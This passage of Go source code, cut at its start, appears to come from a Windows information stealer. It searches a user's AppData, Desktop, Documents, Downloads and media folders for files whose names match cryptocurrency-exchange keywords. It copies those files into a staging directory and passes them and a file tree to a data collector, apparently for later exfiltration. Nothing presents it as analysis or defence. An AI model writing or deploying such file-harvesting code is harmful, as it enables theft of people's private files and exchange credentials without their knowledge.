		searchDirs := []string{
			filepath.Join(user, "AppData\\Roaming"),
			filepath.Join(user, "AppData\\Local"),
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip very large files (>50MB)
				if info.Size() > 50*1024*1024 {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Check for exchange keywords
				isExchangeFile := false
				for _, keyword := range exchangeKeywords {
					if strings.Contains(fileName, keyword) {
						isExchangeFile = true
						break
					}
				}

				if !isExchangeFile {
					return nil
				}

				// Create unique identifier to avoid duplicates
				fileKey := fmt.Sprintf("%s_%s_%d", path, userName, info.Size())
				if foundFiles[fileKey] {
					return nil
				}
				foundFiles[fileKey] = true

				relPath, _ := filepath.Rel(user, path)
				destPath := filepath.Join(tempDir, userName, "ExchangeFiles", relPath)
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

				if err := fileutil.CopyFile(path, destPath); err == nil {
					totalSize += info.Size()
					found++
				}

				return nil
			})
		}
	}

	exchangeInfo := map[string]interface{}{
		"ExchangeFilesFound": found,
		"TotalSizeMB":        totalSize / (1024 * 1024),
		"TreeView":           fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("exchange_files", exchangeInfo)
	dataCollector.AddDirectory("exchange_files", tempDir, "exchange_files")
}